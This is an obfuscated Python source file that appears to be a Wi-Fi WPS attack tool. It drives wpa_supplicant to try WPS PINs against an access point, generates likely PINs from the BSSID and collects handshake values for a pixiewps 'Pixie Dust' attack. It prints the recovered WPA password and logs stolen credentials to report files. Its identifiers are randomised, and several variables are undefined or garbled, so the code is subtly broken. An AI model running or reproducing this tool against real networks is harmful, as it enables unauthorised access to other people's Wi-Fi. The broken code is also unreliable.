    def tXjKRWNjdjXpttyKcyiGMapBIwRVyfdD(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        return LbTGECbzTkRswruysYAkyIvEceyzivuI.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC & 0xFFFFFFF
    def UawREzovSqElPEnGIOvMaogEPFFvbuJx(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        return LbTGECbzTkRswruysYAkyIvEceyzivuI.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC % 0x100000000
    def cnNVlLAdmmFrCMsaUNQdOoBYRIsPFdkw(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        kEIKuPAomBoMVNJsaiuRHwpdxkbZmAXN = LbTGECbzTkRswruysYAkyIvEceyzivuI.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC & 0xFFFFFF
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = kEIKuPAomBoMVNJsaiuRHwpdxkbZmAXN ^ 0x55AA55
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF ^= (((FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF & 0xF) << 4) +
                ((FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF & 0xF) << 8) +
                ((FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF & 0xF) << 12) +
                ((FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF & 0xF) << 16) +
                ((FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF & 0xF) << 20))
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF %= int(10e6)
        if FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF < int(10e5):
            FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF += ((FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF % 9) * int(10e5)) + int(10e5)
        return FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF
    def GNdqXcZwheMrEuHddSCihPVEjcoaYrSv(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        LbTGECbzTkRswruysYAkyIvEceyzivuI.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC += 1
        return self.cnNVlLAdmmFrCMsaUNQdOoBYRIsPFdkw(LbTGECbzTkRswruysYAkyIvEceyzivuI)
    def xpNxPiWhonkQMfWKhKfhciPRgFnOyOQR(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        b = [int(bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl, 16) for bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl in LbTGECbzTkRswruysYAkyIvEceyzivuI.NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR.split(':')]
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = ''
        for bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl in range(7):
            FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF += str((b[bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl % 6] + b[5]) % (10 - (bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF)
    def YDQUqPKxvOfLRacdQgoAwfniWMwXpCDX(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        b = [int(bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl, 16) for bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl in LbTGECbzTkRswruysYAkyIvEceyzivuI.NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR.split(':')]
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF
def XRrUnhasPFxtpXCeVyzidZgpCPlxdswX(pipe, what):
    tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ = ''
    while True:
        gYdXXqhTTeaLyBgGsIigojKlIpjVEkzn = pipe.stdout.read(1)
        if gYdXXqhTTeaLyBgGsIigojKlIpjVEkzn == '':
            return tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ
        tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ += gYdXXqhTTeaLyBgGsIigojKlIpjVEkzn
        if what in tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ:
            return tpDygRvjEWOVwDvOuGOTJvvFzcqMpOjJ
def bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA):
    NtuuZHQTHwRizxEbJxqNgaDdfbRvYxLV = KZJQOIJmIOErYpaInENervxVbGyBavBA.split(':', 3)
    return NtuuZHQTHwRizxEbJxqNgaDdfbRvYxLV[2].replace(' ', '').upper()
class txxEtggasPihdbPKAvnRrlpGqXWZQKpO:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
    def clear(self):
        self.__init__()
    def ElbSxsNsjzefaJJPMslkgYZGnGyWrRdI(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)
    def UzxRSFGXFzkCKpdHJAmxBNJimaJlJENW(self, full_range=False):
        JXolEeWPHkTrdHxDjLyJoZKSZdwLNkUP = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            JXolEeWPHkTrdHxDjLyJoZKSZdwLNkUP += ' --force'
        return JXolEeWPHkTrdHxDjLyJoZKSZdwLNkUP
class hyXeHCJumaaTWOXwvHKuwFZSKahCqlYW:
    def __init__(self):
        self.status = ''   
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
    def VzwKJQvvylPuEPAsKUGAypwyHIhTyqNQ(self):
        return self.last_m_message > 5
    def clear(self):
        self.__init__()
class WFEayWgfBtyYbKzLWSksafdzWeDRHkEx:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5
    def hUKASxsRbYpLvdvdwRnQvybOvYHbmzqo(self):
        aXIAPAgWSaavkZPFPJSNHqyLEgvLoODQ = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            VxtUTAlrKAfMftRYzmBkLjlFOfWnTuuW = int(self.mask) / 11000 * 100
        else:
            VxtUTAlrKAfMftRYzmBkLjlFOfWnTuuW = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            VxtUTAlrKAfMftRYzmBkLjlFOfWnTuuW, self.start_time, aXIAPAgWSaavkZPFPJSNHqyLEgvLoODQ))
    def TYJdxMWEMzFgFsFldLyeMjWRfTmKImKA(self, mask):
        self.mask = mask
        self.counter += 1
        pgIixdnqOpGyNFXzdAXxEmXGUcdnNmQB = time.time()
        self.attempts_times.append(pgIixdnqOpGyNFXzdAXxEmXGUcdnNmQB - self.last_attempt_time)
        self.last_attempt_time = pgIixdnqOpGyNFXzdAXxEmXGUcdnNmQB
        if self.counter == self.statistics_period:
            self.counter = 0
            self.hUKASxsRbYpLvdvdwRnQvybOvYHbmzqo()
    def clear(self):
        self.__init__()
class ZvhDcoBVXZODVmGXKwEdILgClNBIriNG:
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.kpMZBVxnGdNNvsskaenPDncNkwqVNsFq()
        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)
        self.pixie_creds = txxEtggasPihdbPKAvnRrlpGqXWZQKpO()
        self.connection_status = hyXeHCJumaaTWOXwvHKuwFZSKahCqlYW()
        DmISBiVuzaHFnJuuyoXsZcwWNpLZOuIx = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.BiRi/sessions/'
        self.pixiewps_dir = f'{user_home}/.BiRi/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)
        self.generator = AisLtNShsrLJqKyyfKmfIqXcDEgBCkcV()
    def kpMZBVxnGdNNvsskaenPDncNkwqVNsFq(self):
        print('[*] Running wpa_supplicantâ€¦')
        ibGLmqZzMCJImSMbHIfnnvLQblhNyGpw = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(ibGLmqZzMCJImSMbHIfnnvLQblhNyGpw, shell=True, stdout=subprocess.PIPE,
                                     xvAHbKwsCYauaWAcAmjmSeCCPiQXVXMo=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while not os.path.exists(self.wpas_ctrl_path):
            pass
    def AppEjJnFAEHfKrPWgixwiWtTqFggRDvw(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
    def CMjjCdgtLxyvfKuXqfBdADtUBDgANDVx(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        pLzBPaCUCDWTlYLOaVkdctybYABQjVvb = b.decode('utf-8', errors='replace')
        return pLzBPaCUCDWTlYLOaVkdctybYABQjVvb
    def jsTDuCIIkqklYNAMbDQSazvwekBmWaXb(self, pixiemode=False, KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE=None):
        if not KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE:
            KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE = self.print_debug
        KZJQOIJmIOErYpaInENervxVbGyBavBA = self.wpas.stdout.readline()
        if not KZJQOIJmIOErYpaInENervxVbGyBavBA:
            self.wpas.wait()
            return False
        KZJQOIJmIOErYpaInENervxVbGyBavBA = KZJQOIJmIOErYpaInENervxVbGyBavBA.rstrip('\n')
        if KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE:
            sys.xvAHbKwsCYauaWAcAmjmSeCCPiQXVXMo.write(KZJQOIJmIOErYpaInENervxVbGyBavBA + '\n')
        if KZJQOIJmIOErYpaInENervxVbGyBavBA.startswith('WPS: '):
            if 'Building Message M' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                hEjSjjBuTCkqMiarKXLshlFLneuZdISA = int(KZJQOIJmIOErYpaInENervxVbGyBavBA.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = hEjSjjBuTCkqMiarKXLshlFLneuZdISA
                print('[*] Sending WPS Message M{}â€¦'.format(hEjSjjBuTCkqMiarKXLshlFLneuZdISA))
            elif 'Received M' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                hEjSjjBuTCkqMiarKXLshlFLneuZdISA = int(KZJQOIJmIOErYpaInENervxVbGyBavBA.split('Received M')[1])
                self.connection_status.last_m_message = hEjSjjBuTCkqMiarKXLshlFLneuZdISA
                print('[*] Received WPS Message M{}'.format(hEjSjjBuTCkqMiarKXLshlFLneuZdISA))
                if hEjSjjBuTCkqMiarKXLshlFLneuZdISA == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.connection_status.status = 'WSC_NACK'
                print('[*] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in KZJQOIJmIOErYpaInENervxVbGyBavBA and 'hexdump' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.pixie_creds.e_nonce = bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in KZJQOIJmIOErYpaInENervxVbGyBavBA and 'hexdump' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.pixie_creds.pkr = bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in KZJQOIJmIOErYpaInENervxVbGyBavBA and 'hexdump' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.pixie_creds.pke = bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in KZJQOIJmIOErYpaInENervxVbGyBavBA and 'hexdump' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.pixie_creds.authkey = bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in KZJQOIJmIOErYpaInENervxVbGyBavBA and 'hexdump' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.pixie_creds.e_hash1 = bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in KZJQOIJmIOErYpaInENervxVbGyBavBA and 'hexdump' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.pixie_creds.e_hash2 = bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in KZJQOIJmIOErYpaInENervxVbGyBavBA and 'hexdump' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(bcZwyONtBcYpDGbhIIlpQklMfAnAduaH(KZJQOIJmIOErYpaInENervxVbGyBavBA)).decode('utf-8', errors='replace')
        elif ': State: ' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
            if '-> SCANNING' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.connection_status.status = 'scanning'
                print('[*] Scanningâ€¦')
        elif ('WPS-FAIL' in KZJQOIJmIOErYpaInENervxVbGyBavBA) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
            self.connection_status.status = 'authenticating'
            if 'SSID' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Authenticatingâ€¦')
        elif 'Authentication response' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
            print('[+] Authenticated')
        elif 'Trying to associate with' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
            self.connection_status.status = 'associating'
            if 'SSID' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associating with APâ€¦')
        elif ('Associated with' in KZJQOIJmIOErYpaInENervxVbGyBavBA) and (self.interface in KZJQOIJmIOErYpaInENervxVbGyBavBA):
            XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb = KZJQOIJmIOErYpaInENervxVbGyBavBA.split()[-1].upper()
            if self.connection_status.essid:
                print('[+] Associated with {} (ESSID: {})'.format(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, self.connection_status.essid))
            else:
                print('[+] Associated with {}'.format(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb))
        elif 'EAPOL: txStart' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
            self.connection_status.status = 'eapol_start'
            print('[*] Sending EAPOL Startâ€¦')
        elif 'EAP entering state IDENTITY' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
            print('[*] Received Identity Request')
        elif 'using real identity' in KZJQOIJmIOErYpaInENervxVbGyBavBA:
            print('[*] Sending Identity Responseâ€¦')
        return True
    def FwTJpXMWKinPBezYjTcVpAFzrpsuUMOx(self, showcmd=False, full_range=False):
        print("[*] Running Pixiewpsâ€¦")
        ibGLmqZzMCJImSMbHIfnnvLQblhNyGpw = self.pixie_creds.UzxRSFGXFzkCKpdHJAmxBNJimaJlJENW(full_range)
        if showcmd:
            print(ibGLmqZzMCJImSMbHIfnnvLQblhNyGpw)
        r = subprocess.run(ibGLmqZzMCJImSMbHIfnnvLQblhNyGpw, shell=True, stdout=subprocess.PIPE,
                           xvAHbKwsCYauaWAcAmjmSeCCPiQXVXMo=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            JByozwtnxiDHayPgNrbwUmXpwONFACvb = r.stdout.splitlines()
            for KZJQOIJmIOErYpaInENervxVbGyBavBA in JByozwtnxiDHayPgNrbwUmXpwONFACvb:
                if ('[+]' in KZJQOIJmIOErYpaInENervxVbGyBavBA) and ('WPS pin' in KZJQOIJmIOErYpaInENervxVbGyBavBA):
                    FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = KZJQOIJmIOErYpaInENervxVbGyBavBA.split(':')[-1].strip()
                    if FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF == '<empty>':
                        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = "''"
                    return FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF
        return False
    def bMSGzZPqMUMPJatPXheQGUeKasnvHvMt(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[âœ”] WIFI WPS PIN: '{wps_pin}'")
        print(f"[âœ”] WIFI PASSWORD: '{wpa_psk}'")
        print(f"[âœ”] WIFI BSSID: '{essid}'")
    def xxwxTOYxMeQJmWRYPTBhMKfiubmOtJZY(self, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl = self.reports_dir + 'stored'
        xnQEcQtOZXXRXXDpOexNnhjtDVRdOdQC = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        xnQEcQtOZXXRXXDpOexNnhjtDVRdOdQC, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, essid, wps_pin, wpa_psk
                    )
            )
        fqyebJDJApLPHoPazUwxBhapugNGQMNf = not os.path.isfile(EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl + '.csv')
        with open(EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl + '.csv', 'a', newline='', encoding='utf-8') as file:
            fUJgKclMpAYigBzubCkpFkZOkAerXtSE = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if fqyebJDJApLPHoPazUwxBhapugNGQMNf:
                fUJgKclMpAYigBzubCkpFkZOkAerXtSE.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            fUJgKclMpAYigBzubCkpFkZOkAerXtSE.writerow([xnQEcQtOZXXRXXDpOexNnhjtDVRdOdQC, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
    def yBvPTgFSyNUcVsebYeiDMhESWtmbXyXk(self, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF):
        EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl = self.pixiewps_dir + '{}.run'.format(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb.replace(':', '').upper())
        with open(EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl, 'w') as file:
            file.write(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF)
        print('[i] PIN saved in {}'.format(EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl))
    def zfnRLzqmeeGPGiFOgkhlqTmayLWdWMBl(self, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb):
        AsOvLGaaYdcehdlNZtabTerNvKtvvuXH = self.generator.iqWBwLTdrWbdygeJsIJEimZqVyriGMZj(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb)
        if len(AsOvLGaaYdcehdlNZtabTerNvKtvvuXH) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF in enumerate(AsOvLGaaYdcehdlNZtabTerNvKtvvuXH):
                InNvmnGTtaRZCHMPqLePpEUECrgDxipf = '{})'.format(bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl + 1)
                KZJQOIJmIOErYpaInENervxVbGyBavBA = '{:<3} {:<10} {:<}'.format(
                    InNvmnGTtaRZCHMPqLePpEUECrgDxipf, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF['pin'], FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF['name'])
                print(KZJQOIJmIOErYpaInENervxVbGyBavBA)
            while 1:
                QDjWXNuVpAprjBCWHGeTexsiVAtiHUKF = input('Select the PIN: ')
                try:
                    if int(QDjWXNuVpAprjBCWHGeTexsiVAtiHUKF) in range(1, len(AsOvLGaaYdcehdlNZtabTerNvKtvvuXH)+1):
                        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = AsOvLGaaYdcehdlNZtabTerNvKtvvuXH[int(QDjWXNuVpAprjBCWHGeTexsiVAtiHUKF) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')
                else:
                    break
        elif len(AsOvLGaaYdcehdlNZtabTerNvKtvvuXH) == 1:
            FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = AsOvLGaaYdcehdlNZtabTerNvKtvvuXH[0]
            print('[i] The only probable PIN is selected:', FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF['name'])
            FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF['pin']
        else:
            return None
        return FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF
    def EbPRGlCwbdXPFkozMJIQIuRduSDMeOeV(self, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF, pixiemode=False, KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE=None):
        if not KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE:
            KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   
        print(f"[*] Trying PIN '{FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF}'â€¦")
        r = self.CMjjCdgtLxyvfKuXqfBdADtUBDgANDVx(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            if r == 'UNKNOWN COMMAND':
                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                      'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
            else:
                print('[!] Something went wrong â€” check out debug log')
            return False
        while True:
            gxWcaANitfgieJDDEYYFCLqqnTxZaBho = self.jsTDuCIIkqklYNAMbDQSazvwekBmWaXb(pixiemode=pixiemode, KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE=KVtwnmBWbLVFgVXRAqZIjwvyFKlolwuE)
            if not gxWcaANitfgieJDDEYYFCLqqnTxZaBho:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break
        self.AppEjJnFAEHfKrPWgixwiWtTqFggRDvw('WPS_CANCEL')
        return False
    def RNOVysRoHxBeoGUymdLECPLpvjXsGRHW(self, XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF=None, pixiemode=False, showpixiecmd=False,
                          MbTqVOZMGcWXodaOkRAoFIWbOOMJzCVA=False, store_pin_on_fail=False):
        if not FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF:
            if pixiemode:
                try:
                    EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl = self.pixiewps_dir + '{}.run'.format(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb.replace(':', '').upper())
                    with open(EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl, 'r') as file:
                        jTetSKkRpNAMKLPbcumEgbEEerFoYDZd = file.readline().strip()
                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(jTetSKkRpNAMKLPbcumEgbEEerFoYDZd)).lower() != 'n':
                            FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = jTetSKkRpNAMKLPbcumEgbEEerFoYDZd
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = self.generator.fUseouLYadkKdRXLtrfinWMUASstmCsr(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb) or '12345670'
            else:
                FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = self.zfnRLzqmeeGPGiFOgkhlqTmayLWdWMBl(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb) or '12345670'
        if store_pin_on_fail:
            try:
                self.EbPRGlCwbdXPFkozMJIQIuRduSDMeOeV(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF, pixiemode)
            except KeyboardInterrupt:
                print("\nAbortingâ€¦")
                self.yBvPTgFSyNUcVsebYeiDMhESWtmbXyXk(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF)
                return False
        else:
            self.EbPRGlCwbdXPFkozMJIQIuRduSDMeOeV(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF, pixiemode)
        if self.connection_status.status == 'GOT_PSK':
            self.bMSGzZPqMUMPJatPXheQGUeKasnvHvMt(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.xxwxTOYxMeQJmWRYPTBhMKfiubmOtJZY(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, self.connection_status.essid, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF, self.connection_status.wpa_psk)
            EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl = self.pixiewps_dir + '{}.run'.format(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb.replace(':', '').upper())
            try:
                os.remove(EiXGZxvUBEYdXBzpQiuicFlTPBvzVVpl)
            except FileNotFoundError:
                pass
            return True
        elif pixiemode:
            if self.pixie_creds.ElbSxsNsjzefaJJPMslkgYZGnGyWrRdI():
                FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = self.FwTJpXMWKinPBezYjTcVpAFzrpsuUMOx(showpixiecmd, MbTqVOZMGcWXodaOkRAoFIWbOOMJzCVA)
                if FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF:
                    return self.RNOVysRoHxBeoGUymdLECPLpvjXsGRHW(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                self.yBvPTgFSyNUcVsebYeiDMhESWtmbXyXk(XeSRfRCtzQEYzeULoIfvbgfDuXhYSCjb, FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF)
            return False
